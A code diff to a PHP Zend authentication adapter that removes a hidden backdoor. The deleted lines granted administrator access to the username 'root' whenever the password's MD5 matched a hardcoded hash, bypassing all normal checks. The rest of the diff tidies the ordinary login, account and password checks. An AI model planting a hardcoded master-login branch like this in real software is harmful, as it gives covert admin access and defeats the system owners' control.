@@ -90,29 +90,20 @@ class UserAuthAdapter implements \Zend_Auth_Adapter_Interface {
             'identity' => null
         );
         
-        if ($this->_username == 'root' && md5($this->_password) == '6519072b3357219cfa325ce1303e77a4')
-        {
-            $user = User::getById(ADMIN_ID);
-        }
-        else
-        {
-			$user = null;
-            if ($this->_username) $user = User::getByLogin($this->_username);  
+		$user = null;
+		if ($this->_username) $user = User::getByLogin($this->_username);  
 
-			if (!$user && $this->_email) $user = User::getByEmail($this->_email);
+		if (!$user && $this->_email) $user = User::getByEmail($this->_email);
 
-            if (!$user || !$user->isEnabled() || (!$user->allowBackOffice() && $this->_backoffice))
-            {
-                $this->_authenticateResultInfo['code'] = \Zend_Auth_Result::FAILURE_IDENTITY_NOT_FOUND;
-                return $this->_authenticateCreateAuthResult();
-            }
-            
-          	if (!$user->checkPassword($this->_password))
-            {
-                  $this->_authenticateResultInfo['code'] = \Zend_Auth_Result::FAILURE_CREDENTIAL_INVALID;
-                  return $this->_authenticateCreateAuthResult(); 
-          	}
-        }
+		if (!$user || !$user->isEnabled() || (!$user->allowBackOffice() && $this->_backoffice)) {
+			$this->_authenticateResultInfo['code'] = \Zend_Auth_Result::FAILURE_IDENTITY_NOT_FOUND;
+			return $this->_authenticateCreateAuthResult();
+		}
+		
+		if (!$user->checkPassword($this->_password)) {
+			  $this->_authenticateResultInfo['code'] = \Zend_Auth_Result::FAILURE_CREDENTIAL_INVALID;
+			  return $this->_authenticateCreateAuthResult(); 
+		}
 
         $this->_authenticateResultInfo['code'] = \Zend_Auth_Result::SUCCESS;
         $this->_authenticateResultInfo['identity'] = array(
